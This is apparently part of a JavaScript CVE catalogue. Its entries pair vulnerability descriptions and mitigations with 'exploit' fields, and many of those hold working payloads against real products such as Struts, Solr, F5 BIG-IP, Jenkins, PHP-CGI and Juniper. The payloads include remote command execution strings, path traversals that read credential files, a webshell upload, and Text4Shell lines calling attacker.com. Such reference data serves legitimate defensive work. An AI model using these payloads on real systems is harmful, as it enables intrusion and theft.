  { id: 'CVE-2021-21975', name: 'VMware vRealize SSRF', severity: 'High', cvss: 7.5, published: '2021-03-31', category: 'SSRF', affected: 'VMware vRealize Operations Manager < 8.3.1', description: 'Server-side request forgery in vRealize Operations Manager API. Unauthenticated attacker can make requests to internal services, potentially accessing sensitive management APIs.', exploit: 'POST /casa/nodes/thumbprints HTTP/1.1\n\n["https://internal-service/api/sensitive-data"]', mitigation: 'Apply VMware patches, restrict network access to vRealize management interface.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-21975'], tags: ['vmware', 'vrealize', 'api', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2019-17558', name: 'Apache Solr Velocity RCE', severity: 'High', cvss: 7.5, published: '2019-12-30', category: 'SSRF', affected: 'Apache Solr 5.0.0 - 8.3.1', description: 'RCE in Apache Solr via Velocity template engine. Attacker can enable the VelocityResponseWriter via config API and then inject Velocity template code for command execution.', exploit: 'POST /solr/collection/config -d \'{"set-property":{"requestHandler.*.*.velocityResponseWriter.params.template.base.dir":""}}\'\nGET /solr/collection/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($e="")%23set($s=$e.class.forName("java.lang.Runtime").getMethod("exec",$e.class.forName("java.lang.String")).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))', mitigation: 'Upgrade Solr, disable Velocity, restrict Config API access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-17558'], tags: ['solr', 'java', 'velocity', 'template-injection', 'config-api'], platform: 'Cross-platform' },
  { id: 'CVE-2020-3452', name: 'Cisco ASA Path Traversal', severity: 'High', cvss: 7.5, published: '2020-07-22', category: 'SSRF', affected: 'Cisco ASA/FTD (multiple versions)', description: 'Path traversal in Cisco ASA and FTD web services allowing unauthenticated read of sensitive files from the filesystem. Can read WebVPN configuration, bookmarks, and cached credentials.', exploit: 'curl -k "https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_full.html&default-language&lang=../"', mitigation: 'Apply Cisco patches, restrict access to web services interface.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-3452'], tags: ['cisco', 'asa', 'ftd', 'vpn', 'path-traversal'], platform: 'Network' },
  { id: 'CVE-2019-18935', name: 'Telerik UI Deserialization', severity: 'Critical', cvss: 9.8, published: '2019-12-09', category: 'Deserialization', affected: 'Telerik UI for ASP.NET AJAX < 2020.1.114', description: 'Insecure deserialization in Telerik.Web.UI.dll used in ASP.NET applications. When combined with known encryption keys (CVE-2017-9248), allows unauthenticated RCE through crafted serialized objects.', exploit: 'python3 RAU_crypto.py -P "C:\\Windows\\Temp" http://target/Telerik.Web.UI.WebResource.axd', mitigation: 'Upgrade Telerik UI, rotate machineKey, check for IOCs.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-18935'], tags: ['telerik', 'dotnet', 'asp.net', 'web-ui'], platform: 'Windows' },
  { id: 'CVE-2022-44877', name: 'CWP RCE', severity: 'Critical', cvss: 9.8, published: '2023-01-05', category: 'RCE', affected: 'CentOS Web Panel (CWP) < 0.9.8.1147', description: 'Unauthenticated RCE in CentOS Web Panel login page. OS command injection via the login parameter allows arbitrary command execution as root without authentication.', exploit: 'POST /login/index.php?login=$(id)', mitigation: 'Update CWP to latest version, restrict access to management port.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-44877'], tags: ['cwp', 'centos', 'hosting', 'command-injection', 'pre-auth'], platform: 'Linux' },

  // ── Buffer Overflow (8) ────────────────────────────────────
  { id: 'CVE-2014-0160', name: 'Heartbleed', severity: 'High', cvss: 7.5, published: '2014-04-07', category: 'Info Disclosure', affected: 'OpenSSL 1.0.1 - 1.0.1f', description: 'Buffer over-read in OpenSSL TLS heartbeat extension allowing extraction of up to 64KB of memory per request. Can leak private keys, session tokens, passwords, and other sensitive data from server memory.', exploit: 'python3 heartbleed.py target 443\nnmap -p 443 --script ssl-heartbleed target', mitigation: 'Upgrade OpenSSL to 1.0.1g+, revoke and reissue SSL certificates, rotate all credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2014-0160'], tags: ['openssl', 'tls', 'heartbeat', 'memory-leak', 'crypto'], platform: 'Cross-platform' },
  { id: 'CVE-2014-0050', name: 'Apache Commons FileUpload DoS', severity: 'High', cvss: 7.5, published: '2014-02-06', category: 'DoS', affected: 'Apache Commons FileUpload < 1.3.1', description: 'Denial of service via crafted multipart/form-data Content-Type header. The MultipartStream class does not properly handle extremely large boundary strings, causing excessive CPU consumption.', exploit: 'Send multipart request with Content-Type boundary containing 4093+ characters', mitigation: 'Upgrade to Apache Commons FileUpload 1.3.1+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2014-0050'], tags: ['apache', 'commons', 'fileupload', 'multipart'], platform: 'Cross-platform' },
  { id: 'CVE-2023-25136', name: 'OpenSSH Pre-Auth Double Free', severity: 'Medium', cvss: 6.5, published: '2023-02-03', category: 'Buffer Overflow', affected: 'OpenSSH 9.1', description: 'Double free vulnerability in OpenSSH server (sshd) during pre-authentication phase. While exploitation for RCE is considered difficult, it could potentially lead to code execution in unprivileged pre-auth process.', exploit: 'Triggered during SSH key exchange by manipulating memory allocation patterns', mitigation: 'Upgrade to OpenSSH 9.2+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-25136'], tags: ['openssh', 'double-free', 'pre-auth', 'memory'], platform: 'Cross-platform' },
  { id: 'CVE-2022-3602', name: 'OpenSSL X.509 Buffer Overflow', severity: 'High', cvss: 7.5, published: '2022-11-01', category: 'Buffer Overflow', affected: 'OpenSSL 3.0.0 - 3.0.6', description: 'Stack buffer overflow in X.509 certificate verification, specifically in name constraint checking. Crafted email address in certificate can trigger 4-byte overflow, potentially enabling RCE.', exploit: 'Craft X.509 certificate with malicious email address containing punycode', mitigation: 'Upgrade to OpenSSL 3.0.7+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-3602'], tags: ['openssl', 'x509', 'certificate', 'stack-overflow'], platform: 'Cross-platform' },

  // ── XXE (7) ────────────────────────────────────────────────
  { id: 'CVE-2018-20843', name: 'libexpat XXE DoS', severity: 'High', cvss: 7.5, published: '2019-06-24', category: 'XXE', affected: 'libexpat < 2.2.7', description: 'XML parser vulnerability in libexpat causing excessive memory allocation via crafted XML with many colons in namespace names. Can cause denial of service through memory exhaustion.', exploit: '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', mitigation: 'Upgrade libexpat to 2.2.7+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-20843'], tags: ['xml', 'parser', 'libexpat', 'memory-exhaustion'], platform: 'Cross-platform' },
  { id: 'CVE-2014-3529', name: 'Apache POI XXE', severity: 'Medium', cvss: 5.0, published: '2014-09-04', category: 'XXE', affected: 'Apache POI < 3.10.1', description: 'XML External Entity injection in Apache POI when processing .xlsx, .docx, .pptx files. Attacker can craft Office documents to read local files or trigger SSRF on the server.', exploit: 'Craft .xlsx with [Content_Types].xml:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<Types>&xxe;</Types>', mitigation: 'Upgrade Apache POI, disable external entities in XML parsing.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2014-3529'], tags: ['apache-poi', 'java', 'office', 'xlsx'], platform: 'Cross-platform' },
  { id: 'CVE-2021-29441', name: 'Nacos Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2021-04-27', category: 'Auth Bypass', affected: 'Alibaba Nacos < 1.4.1', description: 'Authentication bypass in Nacos server by spoofing the User-Agent header to "Nacos-Server". Unauthenticated attackers can access all APIs including user creation and configuration management.', exploit: 'curl -X GET "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" -H "User-Agent: Nacos-Server"', mitigation: 'Upgrade Nacos to 1.4.1+, enable auth.enabled=true, change default credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-29441'], tags: ['nacos', 'alibaba', 'user-agent', 'pre-auth', 'cloud'], platform: 'Cross-platform' },
  { id: 'CVE-2021-25646', name: 'Apache Druid RCE', severity: 'High', cvss: 8.8, published: '2021-01-29', category: 'RCE', affected: 'Apache Druid < 0.20.1', description: 'RCE via user-provided JavaScript code in Apache Druid ingestion tasks. The InputSource interface allows specifying JavaScript functions that execute server-side with no sandboxing.', exploit: 'POST /druid/indexer/v1/sampler with "type": "javascript" containing Runtime.exec() payload', mitigation: 'Upgrade Apache Druid, disable JavaScript ingestion, restrict API access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-25646'], tags: ['druid', 'java', 'javascript', 'ingestion'], platform: 'Cross-platform' },
  { id: 'CVE-2020-11651', name: 'SaltStack Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2020-04-30', category: 'Auth Bypass', affected: 'SaltStack Salt < 3000.2', description: 'Authentication bypass in SaltStack Salt master. The ClearFuncs class allows unauthenticated access to methods that should require authentication, enabling retrieval of the root key and command execution.', exploit: 'python3 exploit.py --master target --exec "id"\n# Bypasses auth to retrieve root key, then executes commands on all minions', mitigation: 'Upgrade SaltStack, restrict access to Salt master port (4505/4506), use firewall rules.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-11651'], tags: ['saltstack', 'salt', 'python', 'master', 'config-management'], platform: 'Linux' },
  { id: 'CVE-2018-11776', name: 'Apache Struts Namespace RCE', severity: 'Critical', cvss: 9.8, published: '2018-08-22', category: 'RCE', affected: 'Apache Struts 2.3 - 2.3.34, 2.5 - 2.5.16', description: 'RCE via OGNL injection through namespace handling in Apache Struts. When action configuration uses wildcard namespace or no namespace, attacker-controlled input is evaluated as OGNL expression.', exploit: 'GET /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\'struts.valueStack\'].context).(#cr=#ct[\'com.opensymphony.xwork2.ActionContext.container\']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#cmd=\'id\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}/help.action', mitigation: 'Upgrade to Apache Struts 2.3.35 or 2.5.17+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-11776'], tags: ['struts', 'java', 'ognl', 'namespace'], platform: 'Cross-platform' },
  { id: 'CVE-2021-44142', name: 'Samba vfs_fruit Heap RW', severity: 'Critical', cvss: 9.9, published: '2022-01-31', category: 'Buffer Overflow', affected: 'Samba < 4.13.17, < 4.14.12, < 4.15.5', description: 'Out-of-bounds heap read/write in Samba vfs_fruit module used for macOS interoperability. Allows remote code execution as root through crafted AppleDouble file metadata via SMB.', exploit: 'Craft malicious AppleDouble extended attributes via SMB to trigger heap corruption in vfs_fruit', mitigation: 'Upgrade Samba, disable vfs_fruit module if not needed.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-44142'], tags: ['samba', 'smb', 'macos', 'heap-overflow', 'vfs'], platform: 'Linux' },

  // ── Additional CVEs to reach 155 ──────────────────────────
  { id: 'CVE-2020-5902', name: 'F5 BIG-IP TMUI RCE', severity: 'Critical', cvss: 9.8, published: '2020-07-01', category: 'RCE', affected: 'F5 BIG-IP 11.x-15.x (TMUI/Configuration Utility)', description: 'Unauthenticated RCE in F5 BIG-IP Traffic Management User Interface. Path traversal allows bypassing authentication and executing arbitrary commands via the Java application.', exploit: 'curl -k "https://target/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"', mitigation: 'Apply F5 hotfix, restrict TMUI access to management network.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-5902'], tags: ['f5', 'bigip', 'tmui', 'path-traversal'], platform: 'Network' },
  { id: 'CVE-2018-13379', name: 'FortiGate SSL VPN Path Traversal', severity: 'Critical', cvss: 9.8, published: '2019-05-24', category: 'Info Disclosure', affected: 'FortiOS 5.6.3-5.6.7, 6.0.0-6.0.4', description: 'Path traversal in FortiGate SSL VPN web portal. Unauthenticated attackers can download system files including cleartext VPN credentials via crafted HTTP request.', exploit: 'curl -k "https://target:4443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"', mitigation: 'Upgrade FortiOS, rotate VPN credentials, enable MFA.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-13379'], tags: ['fortinet', 'vpn', 'path-traversal', 'credential-leak'], platform: 'Network' },
  { id: 'CVE-2019-5544', name: 'VMware ESXi OpenSLP Heap Overflow', severity: 'Critical', cvss: 9.8, published: '2019-12-06', category: 'Buffer Overflow', affected: 'VMware ESXi 6.0-6.7, vCenter 6.7', description: 'Heap buffer overflow in OpenSLP as used in ESXi. Remote unauthenticated attacker can exploit the SLP service on port 427 to achieve code execution on the hypervisor.', exploit: 'python3 esxi_slp_exploit.py target 427', mitigation: 'Disable SLP service, apply VMware patches, block port 427.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-5544'], tags: ['vmware', 'esxi', 'slp', 'heap-overflow', 'hypervisor'], platform: 'Cross-platform' },
  { id: 'CVE-2021-26084', name: 'Confluence OGNL Injection (2021)', severity: 'Critical', cvss: 9.8, published: '2021-08-25', category: 'RCE', affected: 'Atlassian Confluence < 6.13.23, < 7.4.11, < 7.11.6, < 7.12.5, < 7.13.0', description: 'OGNL injection in Confluence Server/DC via the /pages/createpage-entervariables.action endpoint. Unauthenticated attackers can execute arbitrary commands on the server.', exploit: 'curl "http://target/pages/createpage-entervariables.action" --data "queryString=aaaa\\u0027+%7B233*233%7D+%5C%27bbb"', mitigation: 'Upgrade Confluence, restrict public access to Confluence, WAF rules.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-26084'], tags: ['confluence', 'atlassian', 'ognl', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2019-0604', name: 'SharePoint RCE', severity: 'Critical', cvss: 9.8, published: '2019-03-05', category: 'RCE', affected: 'Microsoft SharePoint 2010-2019', description: 'RCE via unsafe deserialization in SharePoint\'s EntityInstanceIdEncoder component. Crafted XML payload sent to picker.aspx triggers arbitrary code execution on the server.', exploit: 'POST /_layouts/15/picker.aspx with crafted __VIEWSTATE containing ysoserial payload', mitigation: 'Apply Microsoft security patches, restrict SharePoint access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-0604'], tags: ['sharepoint', 'microsoft', 'deserialization', 'xml'], platform: 'Windows' },
  { id: 'CVE-2020-2551', name: 'WebLogic IIOP Deserialization', severity: 'Critical', cvss: 9.8, published: '2020-01-15', category: 'Deserialization', affected: 'Oracle WebLogic 10.3.6, 12.1.3, 12.2.1.3-4', description: 'Remote code execution in WebLogic Server via IIOP protocol. Unauthenticated attacker can send crafted serialized objects over IIOP to achieve code execution on the WebLogic server.', exploit: 'java -jar WebLogic_IIOP_exploit.jar target 7001 "id"', mitigation: 'Apply Oracle patches, disable IIOP protocol if not needed, restrict network access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-2551'], tags: ['weblogic', 'java', 'iiop', 'oracle'], platform: 'Cross-platform' },
  { id: 'CVE-2022-1388', name: 'F5 BIG-IP iControl REST Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2022-05-04', category: 'Auth Bypass', affected: 'F5 BIG-IP 16.x, 15.x, 14.x, 13.x', description: 'Authentication bypass in F5 BIG-IP iControl REST API. Specific request headers allow bypassing authentication through hop-by-hop processing, enabling unauthenticated command execution.', exploit: 'curl -sk -X POST "https://target/mgmt/tm/util/bash" -H "X-F5-Auth-Token: " -H "Connection: X-F5-Auth-Token, X-Forwarded-Host" -d \'{"command":"run","utilCmdArgs":"-c id"}\'', mitigation: 'Apply F5 patches, restrict iControl REST access, block self IP access to mgmt.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-1388'], tags: ['f5', 'bigip', 'auth-bypass', 'rest-api', 'hop-by-hop'], platform: 'Network' },
  { id: 'CVE-2021-42278', name: 'noPac / sAMAccountName Spoofing', severity: 'High', cvss: 8.8, published: '2021-11-09', category: 'Privilege Escalation', affected: 'Active Directory (Windows Server 2008-2022)', description: 'Active Directory privilege escalation by spoofing sAMAccountName attribute. Combined with CVE-2021-42287 (S4U2self), allows any domain user to impersonate the Domain Controller and obtain Domain Admin.', exploit: 'python3 noPac.py domain/user:password -dc-ip DC_IP --impersonate administrator -use-ldap', mitigation: 'Apply November 2021 patches, set ms-DS-MachineAccountQuota to 0.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-42278'], tags: ['active-directory', 'windows', 'kerberos', 'pac', 'domain-privesc'], platform: 'Windows' },
  { id: 'CVE-2020-25078', name: 'D-Link Camera Info Disclosure', severity: 'High', cvss: 7.5, published: '2020-09-02', category: 'Info Disclosure', affected: 'D-Link DCS-2530L, DCS-2670L', description: 'Unauthenticated information disclosure in D-Link IP cameras. Credentials can be retrieved without authentication via the /config/getuser endpoint.', exploit: 'curl "http://target/config/getuser?name=Admin"', mitigation: 'Apply firmware update, restrict camera access, change default credentials.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-25078'], tags: ['dlink', 'iot', 'camera', 'credential-leak'], platform: 'IoT' },
  { id: 'CVE-2019-11510', name: 'Pulse Secure VPN File Read', severity: 'Critical', cvss: 10.0, published: '2019-05-08', category: 'Info Disclosure', affected: 'Pulse Connect Secure < 9.0R3.4, < 8.3R7.1', description: 'Unauthenticated arbitrary file read in Pulse Secure VPN. Can read sensitive files including cleartext credentials, session cookies, and private keys. Massively exploited in the wild.', exploit: 'curl -k "https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"', mitigation: 'Apply Pulse Secure patches immediately, rotate all credentials, revoke VPN sessions.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2019-11510'], tags: ['pulse', 'vpn', 'path-traversal', 'credential-leak'], platform: 'Network' },
  { id: 'CVE-2024-6387', name: 'regreSSHion', severity: 'High', cvss: 8.1, published: '2024-07-01', category: 'RCE', affected: 'OpenSSH 8.5p1 - 9.7p1', description: 'Signal handler race condition (regression of CVE-2006-5051) in OpenSSH sshd allowing unauthenticated remote code execution as root. Affects glibc-based Linux systems. Race condition in SIGALRM handler.', exploit: 'Race condition in LoginGraceTime handling — requires ~10,000 connections over ~6-8 hours on 32-bit, harder on 64-bit', mitigation: 'Upgrade to OpenSSH 9.8+, set LoginGraceTime to 0 (risk: DoS), or limit connections with MaxStartups.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-6387'], tags: ['openssh', 'race-condition', 'signal-handler', 'glibc', 'pre-auth'], platform: 'Linux' },
  { id: 'CVE-2024-4577', name: 'PHP CGI Argument Injection', severity: 'Critical', cvss: 9.8, published: '2024-06-06', category: 'RCE', affected: 'PHP 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 (Windows)', description: 'PHP CGI argument injection on Windows when using specific code pages (Chinese/Japanese). The Best-Fit character mapping converts soft hyphens to real hyphens, bypassing CVE-2012-1823 patches.', exploit: 'POST /php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1\n\n<?php system("whoami"); ?>', mitigation: 'Upgrade PHP, migrate from CGI to FastCGI/FPM, use mod_rewrite to block suspicious query strings.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-4577'], tags: ['php', 'cgi', 'windows', 'argument-injection', 'best-fit'], platform: 'Windows' },
  { id: 'CVE-2023-42793', name: 'JetBrains TeamCity Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2023-09-19', category: 'Auth Bypass', affected: 'JetBrains TeamCity < 2023.05.4', description: 'Authentication bypass in JetBrains TeamCity allowing unauthenticated RCE. Attackers can access internal API endpoints to create admin accounts and execute arbitrary code on the CI/CD server.', exploit: 'POST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1\n— Creates admin authentication token without authentication', mitigation: 'Upgrade to TeamCity 2023.05.4+, restrict network access to TeamCity.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-42793'], tags: ['teamcity', 'jetbrains', 'ci-cd', 'auth-bypass', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2023-51467', name: 'Apache OFBiz Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2023-12-26', category: 'Auth Bypass', affected: 'Apache OFBiz < 18.12.11', description: 'Authentication bypass in Apache OFBiz via empty/invalid USERNAME and PASSWORD parameters combined with requirePasswordChange=Y. Bypasses previous SSRF fix (CVE-2023-49070).', exploit: 'GET /webtools/control/ViewHandlerExt?override=Y&requirePasswordChange=Y HTTP/1.1', mitigation: 'Upgrade to Apache OFBiz 18.12.11+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-51467'], tags: ['ofbiz', 'apache', 'auth-bypass', 'java', 'erp'], platform: 'Cross-platform' },
  { id: 'CVE-2023-36845', name: 'Juniper Junos PHP RCE', severity: 'Critical', cvss: 9.8, published: '2023-08-17', category: 'RCE', affected: 'Juniper Junos OS on SRX/EX series', description: 'Unauthenticated RCE on Juniper SRX and EX devices via PHP environment variable manipulation in J-Web. Attacker can upload a PHP file and set PHPRC to control php.ini loading for code execution.', exploit: 'curl "http://target/webauth_operation.php" -d "rs=do_upload&file_name=/../../tmp/cmd.php&content=<?php system($_GET[c]);?>"', mitigation: 'Apply Juniper patches, disable J-Web, restrict management access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-36845'], tags: ['juniper', 'junos', 'php', 'j-web', 'network'], platform: 'Network' },
  { id: 'CVE-2023-21752', name: 'Windows Backup LPE', severity: 'High', cvss: 7.1, published: '2023-01-10', category: 'Privilege Escalation', affected: 'Windows 10/11, Server 2008-2022', description: 'Local privilege escalation via Windows Backup Service. Allows local attackers to delete arbitrary files as SYSTEM by exploiting the backup service to delete files outside intended directories.', exploit: 'Create junction point from backup target to arbitrary file path, trigger backup delete operation', mitigation: 'Apply January 2023 patches.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-21752'], tags: ['windows', 'backup', 'local-privesc', 'file-delete'], platform: 'Windows' },
  { id: 'CVE-2022-41082', name: 'Exchange PowerShell RCE', severity: 'High', cvss: 8.8, published: '2022-09-30', category: 'RCE', affected: 'Microsoft Exchange Server 2013-2019', description: 'Authenticated RCE via PowerShell remoting in Exchange Server. Part of ProxyNotShell chain (with CVE-2022-41040). Attacker with valid Exchange credentials can execute arbitrary commands.', exploit: 'Chain with CVE-2022-41040 SSRF to reach PowerShell endpoint, then deserialization for RCE', mitigation: 'Apply November 2022 Exchange SU, disable remote PowerShell for non-admin users.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-41082'], tags: ['exchange', 'microsoft', 'powershell', 'deserialization', 'proxynotshell'], platform: 'Windows' },
  { id: 'CVE-2021-27065', name: 'Exchange Arbitrary File Write', severity: 'High', cvss: 7.8, published: '2021-03-02', category: 'RCE', affected: 'Microsoft Exchange Server 2013-2019', description: 'Post-authentication arbitrary file write in Exchange (part of ProxyLogon chain). After SSRF access via CVE-2021-26855, attacker writes webshell to webroot for persistent RCE.', exploit: 'POST /ecp/DDI/DDIService.svc/SetObject with crafted OABVirtualDirectory to write ASPX webshell', mitigation: 'Apply March 2021 patches, scan for webshells in Exchange directories.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-27065'], tags: ['exchange', 'microsoft', 'file-write', 'webshell', 'proxylogon'], platform: 'Windows' },
  { id: 'CVE-2020-0796', name: 'SMBGhost', severity: 'Critical', cvss: 10.0, published: '2020-03-10', category: 'RCE', affected: 'Windows 10 v1903/1909, Server v1903/1909', description: 'RCE in SMBv3.1.1 compression handling. Buffer overflow in srv2.sys when decompressing SMB messages with malformed compression headers. Wormable and can achieve SYSTEM-level RCE.', exploit: 'python3 smbghost_rce.py -ip target\n# Triggers integer overflow in Srv2DecompressData', mitigation: 'Apply KB4551762 patch, disable SMBv3 compression (PowerShell: Set-ItemProperty).', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-0796'], tags: ['windows', 'smb', 'compression', 'wormable', 'buffer-overflow'], platform: 'Windows' },
  { id: 'CVE-2021-20038', name: 'SonicWall SMA100 RCE', severity: 'Critical', cvss: 9.8, published: '2021-12-08', category: 'Buffer Overflow', affected: 'SonicWall SMA 100 Series < 10.2.1.3-27sv', description: 'Unauthenticated stack-based buffer overflow in SonicWall SMA100 web application. Crafted HTTP request to login CGI handler allows remote code execution as root.', exploit: 'Stack buffer overflow in /cgi-bin/management via oversized environment variable in HTTP request', mitigation: 'Update SMA firmware, restrict management access, enable WAF.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2021-20038'], tags: ['sonicwall', 'vpn', 'stack-overflow', 'cgi', 'pre-auth'], platform: 'Network' },
  { id: 'CVE-2020-14750', name: 'WebLogic Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2020-11-01', category: 'Auth Bypass', affected: 'Oracle WebLogic Server 10.3.6, 12.x, 14.1.1', description: 'Authentication bypass in Oracle WebLogic Server console via URL encoding tricks. This is a bypass for the CVE-2020-14882 patch, using double-encoded characters to access the admin console.', exploit: 'curl "http://target:7001/console/css/%252e%252e%252fconsole.portal"', mitigation: 'Apply Oracle January 2021 CPU, restrict console access.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-14750'], tags: ['weblogic', 'oracle', 'auth-bypass', 'url-encoding'], platform: 'Cross-platform' },

  // ── Additional CVEs to reach 155+ ─────────────────────────
  { id: 'CVE-2015-1635', name: 'HTTP.sys RCE', severity: 'Critical', cvss: 9.8, published: '2015-04-14', category: 'RCE', affected: 'Windows 7/8/Server 2008 R2/2012 (HTTP.sys)', description: 'Integer overflow in HTTP.sys allowing unauthenticated RCE by sending a crafted HTTP request with a malicious Range header. Wormable vulnerability in Windows HTTP stack.', exploit: 'curl -v "http://target/" -H "Host: target" -H "Range: bytes=0-18446744073709551615"', mitigation: 'Apply MS15-034 patch, disable IIS kernel caching as workaround.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2015-1635'], tags: ['windows', 'iis', 'http.sys', 'integer-overflow', 'wormable'], platform: 'Windows' },
  { id: 'CVE-2017-7494', name: 'SambaCry', severity: 'Critical', cvss: 9.8, published: '2017-05-24', category: 'RCE', affected: 'Samba 3.5.0 - 4.6.4', description: 'Remote code execution allowing a malicious client to upload a shared library to a writable Samba share and cause the server to load and execute it. Linux equivalent of EternalBlue.', exploit: 'smbclient //target/share -U anonymous -c "put evil.so ./evil.so"\ncurl ... trigger load via named pipe', mitigation: 'Upgrade Samba, add "nt pipe support = no" to smb.conf.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2017-7494'], tags: ['samba', 'smb', 'linux', 'shared-library', 'wormable'], platform: 'Linux' },
  { id: 'CVE-2018-1000861', name: 'Jenkins Groovy RCE', severity: 'Critical', cvss: 9.8, published: '2018-12-10', category: 'RCE', affected: 'Jenkins < 2.138.4, < 2.154', description: 'Unauthenticated RCE via Jenkins Groovy script console. The Stapler web framework allows direct invocation of methods on Java objects, enabling code execution without authentication.', exploit: 'GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public+class+x+{public+x(){Runtime.getRuntime().exec("id")}}', mitigation: 'Upgrade Jenkins, restrict access to script console.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2018-1000861'], tags: ['jenkins', 'java', 'groovy', 'stapler', 'pre-auth'], platform: 'Cross-platform' },
  { id: 'CVE-2020-8617', name: 'BIND DoS', severity: 'High', cvss: 7.5, published: '2020-05-19', category: 'DoS', affected: 'ISC BIND 9.x', description: 'Denial of service via assertion failure when processing crafted DNS queries with TSIG records. A specially crafted message can trigger an assertion failure in BIND, crashing the DNS server.', exploit: 'Send crafted DNS query with malformed TSIG record to cause assertion failure', mitigation: 'Upgrade BIND to patched version, implement DNS rate limiting.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2020-8617'], tags: ['bind', 'dns', 'tsig', 'assertion'], platform: 'Cross-platform' },
  { id: 'CVE-2022-42889', name: 'Text4Shell', severity: 'Critical', cvss: 9.8, published: '2022-10-13', category: 'RCE', affected: 'Apache Commons Text 1.5 - 1.9', description: 'RCE via string interpolation in Apache Commons Text StringSubstitutor. The "script", "dns", and "url" interpolators allow arbitrary code execution when processing untrusted input strings.', exploit: '${script:js:java.lang.Runtime.getRuntime().exec("id")}\n${url:UTF-8:http://attacker.com}\n${dns:address|attacker.com}', mitigation: 'Upgrade to Apache Commons Text 1.10.0+.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-42889'], tags: ['apache', 'commons-text', 'java', 'interpolation', 'string'], platform: 'Cross-platform' },
  { id: 'CVE-2023-27524', name: 'Apache Superset Auth Bypass', severity: 'Critical', cvss: 9.8, published: '2023-04-24', category: 'Auth Bypass', affected: 'Apache Superset < 2.1', description: 'Authentication bypass via default SECRET_KEY in Apache Superset. Installations using the default Flask secret key allow attackers to forge session cookies and gain admin access.', exploit: 'Forge Flask session cookie using default SECRET_KEY: "\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h"', mitigation: 'Upgrade Superset, change SECRET_KEY to a unique random value.', references: ['https://nvd.nist.gov/vuln/detail/CVE-2023-27524'], tags: ['superset', 'apache', 'flask', 'default-key', 'session'], platform: 'Cross-platform' },
